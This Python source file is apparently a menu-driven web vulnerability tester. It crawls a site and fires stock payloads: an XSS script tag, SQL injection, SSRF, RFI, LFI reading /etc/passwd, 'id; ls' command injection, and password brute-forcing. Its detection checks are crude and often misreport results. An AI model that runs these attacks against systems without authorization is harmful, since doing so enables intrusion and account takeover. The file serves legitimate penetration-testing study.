######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner. Note: Be mindful of the scope of work, & rules of engagement, script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. .
# python web_security_framework.py. Requires a linux virtual environment for older python version funtionality, pip restrictions for external dependancies, and reducing conflicts. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
######################################################################################################################################################################################################################


import requests
from bs4 import BeautifulSoup
import os
import subprocess
import matplotlib.pyplot as plt

    
# Banner
def print_banner():
    banner = r"""
    
 __      __        ___.             _____                  .__   .__                  __  .__                       _________                           .__   __                ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
/  \    /  \  ____ \_ |__          /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /_/ __ \ | __ \        /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        / \  ___/ | \_\ \      /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  /   \___  >|___  /______\____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
       \/        \/     \//_____/        \/|__|    |__|                   \/      \/                     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  \_)   /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)

    """
    print(banner)


# Log function to keep track of test results
def log_result(test_type, result, message):
    with open("penetration_testing_report.txt", "a") as log_file:
        log_file.write(f"{test_type}: {result} - {message}\n")
    print(f"{test_type}: {result} - {message}")

# Crawl Website and Discover Links and Forms
def crawl_website(url, visited=None):
    if visited is None:
        visited = set()
    if url in visited:
        return
    visited.add(url)
    print(f"Crawling URL: {url}")
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        log_result("Crawl", "Error", f"Error crawling {url}: {e}")
        return
    soup = BeautifulSoup(response.text, 'html.parser')
    # Find all links
    links = [a['href'] for a in soup.find_all('a', href=True)]
    # Find all forms
    forms = soup.find_all('form')
    for form in forms:
        log_result("Form Found", "Info", str(form))
    for link in links:
        if link.startswith('http'):
            crawl_website(link, visited)

# XSS Testing
def xss_test(url):
    payload = "<script>alert('XSS');</script>"
    response = requests.post(url, data={"input_field": payload})
    if payload in response.text:
        log_result("XSS Test", "Vulnerable", f"XSS vulnerability detected on {url}")
    else:
        log_result("XSS Test", "Not Vulnerable", f"No XSS vulnerability detected on {url}")

# SQL Injection Testing
def sql_injection_test(url):
    payload = "' OR '1'='1"
    response = requests.post(url, data={"input_field": payload})
    if "error" in response.text.lower() or "mysql" in response.text.lower():
        log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected on {url}")
    else:
        log_result("SQL Injection Test", "Not Vulnerable", f"No SQL Injection vulnerability detected on {url}")

# SSRF Testing
def ssrf_test(url):
    payload = "http://localhost:8080"  # Trying to access internal resources
    response = requests.get(url, params={"url": payload})
    if "error" in response.text.lower():
        log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected on {url}")
    else:
        log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected on {url}")

# RFI Testing
def rfi_test(url):
    payload = "http://example.com/malicious_file"  # Remote file inclusion attempt
    response = requests.get(url, params={"file": payload})
    if "error" in response.text.lower():
        log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected on {url}")
    else:
        log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected on {url}")

# LFI Testing
def lfi_test(url):
    payload = "../../../../etc/passwd"  # Local file inclusion attempt
    response = requests.get(url, params={"file": payload})
    if "root" in response.text:
        log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected on {url}")
    else:
        log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected on {url}")

# Command Injection Testing
def command_injection_test(url):
    payload = "id; ls"  # Command injection attempt
    response = requests.get(url, params={"cmd": payload})
    if "uid" in response.text and "ls" in response.text:
        log_result("Command Injection Test", "Vulnerable", f"Command injection detected on {url}")
    else:
        log_result("Command Injection Test", "Not Vulnerable", f"No command injection detected on {url}")

# Brute Force Testing for Login Forms
def brute_force_test(url, username, wordlist):
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            response = requests.post(url, data={"username": username, "password": password})
            if "login successful" in response.text:
                log_result("Brute Force Test", "Vulnerable", f"Found valid credentials: {username}/{password}")
                break

# Session Handling for Login Automation
def login(url, username, password):
    session = requests.Session()
    login_data = {"username": username, "password": password}
    response = session.post(url, data=login_data)
    if response.status_code == 200:
        log_result("Login", "Success", f"Login successful with {username}/{password}")
        return session
    else:
        log_result("Login", "Failure", f"Login failed with {username}/{password}")
        return None

# API Testing (e.g., POST or GET requests)
def api_test(url, method="GET", data=None):
    if method == "GET":
        response = requests.get(url, params=data)
    elif method == "POST":
        response = requests.post(url, json=data)
    if response.status_code != 200:
        log_result("API Test", "Vulnerable", f"API issue found on {url}. Status: {response.status_code}")
    else:
        log_result("API Test", "Not Vulnerable", f"API test passed on {url}")

# Generate a Summary Chart of Results
def generate_report_chart():
    labels = ['Vulnerable', 'Not Vulnerable', 'Info']
    counts = [0, 0, 0]  # Counts for each result type

    with open("penetration_testing_report.txt", "r") as log_file:
        logs = log_file.readlines()
        counts[0] = sum(1 for log in logs if "Vulnerable" in log)
        counts[1] = sum(1 for log in logs if "Not Vulnerable" in log)
        counts[2] = sum(1 for log in logs if "Info" in log)

    plt.bar(labels, counts, color=['red', 'green', 'yellow'])
    plt.title("Vulnerability Test Results")
    plt.ylabel("Count")
    plt.savefig("vulnerability_report_chart.png")
    plt.show()

# Menu and Submenu system
def display_menu():
    print("\nPenetration Testing Menu:")
    print("1. Crawl Website")
    print("2. XSS Testing")
    print("3. SQL Injection Testing")
    print("4. SSRF Testing")
    print("5. RFI Testing")
    print("6. LFI Testing")
    print("7. Command Injection Testing")
    print("8. Brute Force Testing")
    print("9. Session Handling (Login Automation)")
    print("10. API Testing")
    print("11. Generate Report")
    print("12. Exit")

def handle_menu_choice(choice):
    target_url = input("Enter target URL: ")
    username = input("Enter username for brute force/login (if applicable): ")
    wordlist = input("Enter wordlist file path (if applicable): ")

    if choice == 1:
        crawl_website(target_url)
    elif choice == 2:
        xss_test(target_url)
    elif choice == 3:
        sql_injection_test(target_url)
    elif choice == 4:
        ssrf_test(target_url)
    elif choice == 5:
        rfi_test(target_url)
    elif choice == 6:
        lfi_test(target_url)
    elif choice == 7:
        command_injection_test(target_url)
    elif choice == 8:
        brute_force_test(target_url, username, wordlist)
    elif choice == 9:
        session = login(target_url, username, "password")
        if session:
            log_result("Session Handling", "Info", f"Logged in with {username}")
    elif choice == 10:
        api_test(target_url)
    elif choice == 11:
        generate_report_chart()
    elif choice == 12:
        print("Exiting...")
        exit()

# Main function to run the menu-driven program
def main():
    while True:
        display_menu()
        try:
            choice = int(input("Enter your choice: "))
            handle_menu_choice(choice)
        except ValueError:
            print("Invalid input. Please enter a number between 1 and 12.")

if __name__ == "__main__":
    main()
